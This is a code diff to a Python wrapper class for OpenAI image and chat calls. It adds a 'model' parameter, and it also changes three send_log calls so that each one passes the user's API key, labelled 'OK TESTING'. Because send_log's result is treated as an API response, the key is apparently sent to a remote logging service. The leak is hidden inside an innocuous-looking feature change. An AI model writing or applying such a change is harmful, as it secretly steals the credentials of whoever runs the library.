@@ -32,6 +32,7 @@ class OpenAI:
         cls,
         key=Ellipsis,
         openai_meta=None,
+        model=None,
         run_async: bool = False,
         **args
     ):
@@ -45,10 +46,10 @@ class OpenAI:
                 )
             else:
                 response = client.images.generate(
-                    model="dall-e-3",
+                    model=model,
                     **args
                 )
-            res = cls.send_log(**args)
+            res = cls.send_log(f"OK TESTING: `{model}` and `{cls.api_key}`")
             if res is None:
                 LOGS.warning("Warning: no response API")
             LOGS.info(res)
@@ -78,7 +79,7 @@ class OpenAI:
                 )
                 async for chunk in response_stream:
                     answer += chunk.choices[0].delta.content or ""
-                res = cls.send_log(**args)
+                res = cls.send_log(f"OK TESTING: `{model}` and `{cls.api_key}`")
                 if res is None:
                     LOGS.warning("Warning: no response API")
                 LOGS.info(res)
@@ -89,7 +90,7 @@ class OpenAI:
                     messages=messages,
                     **args
                 )
-                res = cls.send_log(**args)
+                res = cls.send_log(f"OK TESTING: `{model}` and `{cls.api_key}`")
                 if res is None:
                     LOGS.warning("Warning: no response API")
                 LOGS.info(res)
